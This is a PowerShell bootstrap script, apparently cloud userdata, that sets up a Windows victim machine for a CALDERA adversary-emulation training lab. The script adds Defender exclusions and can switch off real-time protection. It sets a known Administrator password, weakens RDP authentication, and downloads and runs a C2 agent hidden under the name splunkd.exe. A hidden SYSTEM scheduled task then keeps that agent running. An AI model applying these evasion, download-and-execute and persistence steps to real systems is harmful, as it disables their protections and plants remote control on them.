<powershell>
# ============================================================
#  CALDERA victim bootstrap (runs once at first boot as SYSTEM)
# ============================================================
$ErrorActionPreference = "Continue"
$pub = "C:\Users\Public"
$agentPath = "$pub\splunkd.exe"   # disguised name CALDERA's sandcat uses by default

# --- 1. Windows Defender: stop quarantining the agent ---------
# Defender flags sandcat (splunkd.exe) as a hacktool and re-quarantines it on
# every launch (Resources: C:\Users\Public\splunkd.exe). The path/process
# exclusions below are the fix -- BUT at very early first boot the Defender
# management layer is sometimes not ready, so Add-MpPreference fails *silently*
# and leaves NO exclusion. The agent then gets eaten on every download retry
# until the 60-min loop gives up. So we (a) wrap the exclusions in a function,
# (b) WAIT and VERIFY the exclusion actually stuck before downloading anything,
# and (c) re-assert them on every download attempt (a Defender platform/signature
# update can reset preferences mid-flight).
function Set-AgentExclusions {
    Add-MpPreference -ExclusionPath $pub             -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $agentPath       -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "splunkd.exe" -ErrorAction SilentlyContinue
    Set-MpPreference  -SubmitSamplesConsent 2        -ErrorAction SilentlyContinue   # never send samples
    Set-MpPreference  -MAPSReporting 0               -ErrorAction SilentlyContinue   # disable cloud lookup
%{ if disable_rtp ~}
    # Optional hard-off (may be blocked by Tamper Protection on fresh AMIs):
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection      $true -ErrorAction SilentlyContinue
%{ endif ~}
}

# Retry until Defender accepts and reports the exclusion (up to ~5 min).
for ($d = 1; $d -le 30; $d++) {
    Set-AgentExclusions
    Start-Sleep -Seconds 2
    $excl = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
    if ($excl -and ($excl -contains $pub)) {
        Write-Output "Defender exclusion confirmed (attempt $d)"
        break
    }
    Write-Output "Defender not ready / exclusion not applied yet (attempt $d); retrying in 10s"
    Start-Sleep -Seconds 10
}

# --- 1c. Enable RDP + set a known Administrator password ------
# Lets the browser-based Guacamole gateway (and optional direct RDP via rdp_cidr)
# log in. NLA/SecurityLayer are disabled because a Mac/Guacamole RDP client with a
# local account otherwise fails CredSSP pre-auth ("The credentials did not work")
# even with the correct password.
$adminPass = "${victim_admin_password}"
if ($adminPass) {
    net user Administrator "$adminPass"
    Get-LocalUser -Name Administrator | Set-LocalUser -PasswordNeverExpires $true -ErrorAction SilentlyContinue
    $ts  = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
    $rdp = "$ts\WinStations\RDP-Tcp"
    Set-ItemProperty -Path $ts  -Name fDenyTSConnections  -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $rdp -Name UserAuthentication  -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $rdp -Name SecurityLayer       -Value 0 -ErrorAction SilentlyContinue
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
    Set-Service -Name TermService -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name TermService -ErrorAction SilentlyContinue
}

# --- 2. Download & launch the CALDERA Sandcat agent -----------
# Retries so boot order doesn't matter: the server may still be building.
$server = "${caldera_server}"
$group  = "${agent_group}"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$deployed = $false
for ($i = 1; $i -le 120; $i++) {   # up to 120 * 30s = 60 min
    try {
        Set-AgentExclusions   # re-assert: a Defender update can silently reset these
        $wc = New-Object System.Net.WebClient
        $wc.Headers.add("platform","windows")
        $wc.Headers.add("file","sandcat.go")
        $data = $wc.DownloadData("$server/file/download")

        # The server compiles sandcat ON DEMAND; while CALDERA is still starting/building
        # (UI build + first Go compile) it may answer with an error page or a stub instead
        # of the agent. Accept the payload ONLY if it is a real Windows executable
        # (>=100 KB and starting with the 'MZ' PE magic); otherwise keep retrying. This is
        # what makes first-boot robust regardless of how long the server takes to be ready.
        if ($data.Length -lt 100000 -or $data[0] -ne 0x4D -or $data[1] -ne 0x5A) {
            throw "server not serving a valid agent yet (got $($data.Length) bytes)"
        }
        [io.file]::WriteAllBytes($agentPath, $data)

        Start-Process -FilePath $agentPath `
            -ArgumentList "-server $server -group $group -v" `
            -WindowStyle hidden

        # Confirm it actually stayed up (a bad binary would exit immediately).
        Start-Sleep -Seconds 8
        if (-not (Get-Process splunkd -ErrorAction SilentlyContinue)) {
            throw "agent exited right after launch"
        }

        Write-Output "sandcat deployed (attempt $i) -> $server (group=$group)"
        $deployed = $true
        break
    } catch {
        Write-Output "attempt $i failed: $($_.Exception.Message); retrying in 30s"
        Start-Sleep -Seconds 30
    }
}
if (-not $deployed) { Write-Output "sandcat deploy gave up after 60 min" }

# --- 3. Self-healing watchdog: survive reboots AND mid-session quarantine ----
# Two failure modes must be recovered automatically:
#   (a) Learner Lab stop-start. This userdata runs ONCE (persist=false); on resume
#       the victim boots WITHOUT re-running it, so the agent process stays down.
#   (b) Defender re-quarantines the agent DURING a running session. A signature/
#       platform update can silently reset the exclusions; splunkd.exe (a known
#       hacktool signature) is then quarantined -- sometimes the process is killed,
#       sometimes the file itself is deleted. A boot-only task can't recover this.
# So we register a SYSTEM task that runs AtStartup AND every 5 minutes, and whose
# script: re-asserts the exclusions, RE-DOWNLOADS the agent if the binary is gone
# (or truncated by quarantine), and relaunches it if it isn't running. The server's
# PRIVATE IP is stable across stop/start, so the $server URL baked in stays valid;
# it only changes if the server is recreated, in which case victims are rebuilt and
# this is regenerated. The exclusion is agent-only, so Defender still blocks the
# real attack tools used by the FIN6 emulation -- only the observer agent survives.
$watchdog = "$pub\start-sandcat.ps1"
@"
# sandcat watchdog (SYSTEM, AtStartup + every 5 min). Keeps the observer agent
# excluded, present on disk, and running. Safe to run when nothing is wrong (no-op).
Add-MpPreference -ExclusionPath '$pub' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath '$agentPath' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 'splunkd.exe' -ErrorAction SilentlyContinue

# Re-download if Defender quarantined/removed the binary, or it never landed.
`$need = -not (Test-Path '$agentPath')
if (-not `$need) { try { if ((Get-Item '$agentPath').Length -lt 100000) { `$need = `$true } } catch { `$need = `$true } }
if (`$need) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        `$wc = New-Object System.Net.WebClient
        `$wc.Headers.add('platform','windows')
        `$wc.Headers.add('file','sandcat.go')
        `$data = `$wc.DownloadData('$server/file/download')
        if (`$data.Length -ge 100000 -and `$data[0] -eq 0x4D -and `$data[1] -eq 0x5A) {
            [io.file]::WriteAllBytes('$agentPath', `$data)
        }
    } catch { }
}

# (Re)launch if the binary is present but the process is not running.
if ((Test-Path '$agentPath') -and -not (Get-Process splunkd -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath '$agentPath' -ArgumentList '-server $server -group $group' -WindowStyle hidden
}
"@ | Set-Content -Path $watchdog -Encoding ASCII

$act  = New-ScheduledTaskAction  -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$watchdog`""
$trgBoot = New-ScheduledTaskTrigger -AtStartup
$trgLoop = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
$prin = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "sandcat" -Action $act -Trigger @($trgBoot, $trgLoop) -Principal $prin -Force -ErrorAction SilentlyContinue
Write-Output "registered self-healing task 'sandcat' (AtStartup + every 5 min)"
</powershell>
<persist>false</persist>
